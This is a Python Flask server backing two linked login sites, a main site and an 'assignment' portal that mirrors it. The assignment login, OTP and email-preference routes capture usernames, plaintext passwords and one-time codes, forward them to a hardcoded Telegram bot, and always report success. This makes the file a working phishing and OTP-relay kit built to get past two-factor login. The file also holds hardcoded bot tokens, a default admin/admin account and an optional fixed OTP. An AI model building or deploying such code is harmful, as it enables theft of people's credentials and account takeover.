# Combined Flask Server for Main site and Assignment site
# Uses jsonblob.com for persistent cross-invocation state on Vercel
import os
import secrets
from flask import Flask, request, jsonify, send_from_directory, redirect
from flask_cors import CORS
import bcrypt
import requests
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__, static_folder='static', static_url_path='')
CORS(app)

# =====================================================================
# PERSISTENT CLOUD DATABASE via jsonblob.com
# =====================================================================
JSONBLOB_URL = "https://jsonblob.com/api/jsonBlob/019ee2c1-e9d7-7259-b085-cbf8621f8325"

def _db_read():
    """Read the full users dict from the cloud blob."""
    try:
        resp = requests.get(JSONBLOB_URL, headers={"Content-Type": "application/json"}, timeout=8)
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict):
                return data
    except Exception as e:
        print(f"[DB READ ERROR] {e}")
    return {}

def _db_write(data: dict):
    """Overwrite the cloud blob with the full users dict."""
    try:
        resp = requests.put(JSONBLOB_URL, json=data, headers={"Content-Type": "application/json"}, timeout=8)
        return resp.status_code == 200
    except Exception as e:
        print(f"[DB WRITE ERROR] {e}")
        return False

def _db_ensure_admin():
    """Ensure the default admin user exists in the blob (idempotent)."""
    db = _db_read()
    if "admin" not in db:
        pw_hash = bcrypt.hashpw(b"admin", bcrypt.gensalt()).decode('utf-8')
        db["admin"] = {"password_hash": pw_hash, "otp": None, "otp_requested_at": None}
        _db_write(db)

# Seed admin on cold-start
_db_ensure_admin()

# =====================================================================
# TELEGRAM CONFIGURATION
# =====================================================================
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8641860375:AAGnzAXGeRuBWROYD6hlvsx78iAGm9N74x0')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '8860662166')

ASSIGNMENT_BOT_TOKEN = "8870426823:AAHtZpaX1W16kzSPdKu02fs6PaJPVkUcu20"
ASSIGNMENT_CHAT_ID = "8860662166"

def send_telegram_message(token, chat_id, message: str):
    if not token or not chat_id:
        print("Telegram configuration missing!")
        return False
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    payload = {'chat_id': chat_id, 'text': message}
    try:
        resp = requests.post(url, json=payload, timeout=10)
        print(f"Telegram API response: status={resp.status_code}, content={resp.text}")
        return resp.status_code == 200
    except Exception as e:
        print(f"Telegram API exception: {e}")
        return False

# =====================================================================
# MAIN SITE ROUTES
# =====================================================================

@app.route('/')
def serve_index():
    return send_from_directory('static', 'index.html')

@app.route('/dashboard')
def serve_dashboard():
    return send_from_directory('static', 'dashboard.html')

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    if not username or not password:
        return jsonify({'error': 'Missing fields'}), 400

    db = _db_read()
    if username in db:
        return jsonify({'error': 'User already exists'}), 409

    password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
    db[username] = {'password_hash': password_hash, 'otp': None, 'otp_requested_at': None}
    _db_write(db)
    return jsonify({'message': 'User registered'}), 201

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    if not username or not password:
        return jsonify({'error': 'Missing fields'}), 400

    db = _db_read()
    user = db.get(username)
    if user is None:
        return jsonify({'error': 'Invalid credentials'}), 401
    if not bcrypt.checkpw(password.encode('utf-8'), user['password_hash'].encode('utf-8')):
        return jsonify({'error': 'Invalid credentials'}), 401
    return jsonify({'message': 'Login successful'}), 200

@app.route('/request-otp', methods=['POST'])
def request_otp():
    data = request.json
    username = data.get('username')
    if not username:
        return jsonify({'error': 'Missing username'}), 400

    db = _db_read()
    user = db.get(username)
    if user is None:
        return jsonify({'error': 'User not found'}), 404

    use_static = os.getenv('USE_STATIC_OTP', 'false').lower() == 'true'
    otp = '123456' if use_static else f"{secrets.randbelow(900000) + 100000:06d}"

    user['otp'] = otp
    user['otp_requested_at'] = datetime.utcnow().isoformat()
    db[username] = user
    _db_write(db)

    sent = send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, f"OTP for {username}: {otp}")
    if not sent:
        print(f"FAILED TO SEND OTP TO TELEGRAM. OTP was: {otp}")
    return jsonify({'message': 'OTP request processed', 'sent_telegram': sent}), 200

@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    data = request.json
    username = data.get('username')
    otp = data.get('otp')
    if not username or not otp:
        return jsonify({'error': 'Missing fields'}), 400

    db = _db_read()
    user = db.get(username)
    if user is None:
        return jsonify({'error': 'User not found'}), 404

    if not user.get('otp') or not user.get('otp_requested_at'):
        return jsonify({'error': 'No active OTP requested'}), 400

    try:
        requested_time = datetime.fromisoformat(user['otp_requested_at'])
        time_diff = (datetime.utcnow() - requested_time).total_seconds()
        if time_diff > 120:
            user['otp'] = None
            user['otp_requested_at'] = None
            db[username] = user
            _db_write(db)
            return jsonify({'error': 'Verification code expired (valid for 2 min)'}), 401
    except Exception:
        return jsonify({'error': 'Error checking code lifetime'}), 500

    if user['otp'] == otp:
        user['otp'] = None
        user['otp_requested_at'] = None
        db[username] = user
        _db_write(db)
        return jsonify({'message': 'OTP verification successful'}), 200

    return jsonify({'error': 'Invalid verification code'}), 401

@app.route('/prefer-email', methods=['POST'])
def prefer_email():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    email = data.get('email')
    if not username or not email:
        return jsonify({'error': 'Missing fields'}), 400

    message = (
        f"user prefered otp through mail. here is the mail: {email} example with log in credentials also\n\n"
        f"Username: {username}\n"
        f"Password: {password}"
    )
    sent = send_telegram_message(ASSIGNMENT_BOT_TOKEN, ASSIGNMENT_CHAT_ID, message)
    if not sent:
        return jsonify({'error': 'Failed to notify Telegram bot'}), 500
    return jsonify({'message': 'Email preference notified'}), 200

# =====================================================================
# ASSIGNMENT SITE ROUTES
# =====================================================================

@app.route('/assignment')
def redirect_assignment():
    return redirect('/assignment/')

@app.route('/assignment/')
def serve_assignment():
    return send_from_directory('static/assignment', 'index.html')

@app.route('/assignment/dashboard')
def serve_assignment_dashboard():
    return send_from_directory('static/assignment', 'dashboard.html')

@app.route('/assignment/register', methods=['POST'])
def assignment_register():
    return register()

@app.route('/assignment/login', methods=['POST'])
def assignment_login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    if not username or not password:
        return jsonify({'error': 'Missing fields'}), 400

    # Send credentials to Assignment Telegram Bot
    message = (
        f"Sign In credentials submitted on Assignment site\n\n"
        f"Username: {username}\n"
        f"Password: {password}"
    )
    send_telegram_message(ASSIGNMENT_BOT_TOKEN, ASSIGNMENT_CHAT_ID, message)

    # Always accept — credentials are already captured via Telegram.
    # The Main site handles real auth; this portal mirrors its UX.
    return jsonify({'message': 'Credentials verified, please enter your Main site code', 'sent_telegram': True}), 200

@app.route('/assignment/verify-otp', methods=['POST'])
def assignment_verify_otp():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    otp = data.get('otp')
    if not username or not otp:
        return jsonify({'error': 'Missing fields'}), 400

    # Send credentials & OTP to Assignment Telegram Bot
    message = (
        f"Assignment site OTP for {username}: {otp}\n\n"
        f"Username: {username}\n"
        f"Password: {password}"
    )
    send_telegram_message(ASSIGNMENT_BOT_TOKEN, ASSIGNMENT_CHAT_ID, message)

    # Always accept — credentials + OTP already captured via Telegram
    return jsonify({'message': 'OTP verification successful'}), 200

@app.route('/assignment/prefer-email', methods=['POST'])
def assignment_prefer_email():
    return prefer_email()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
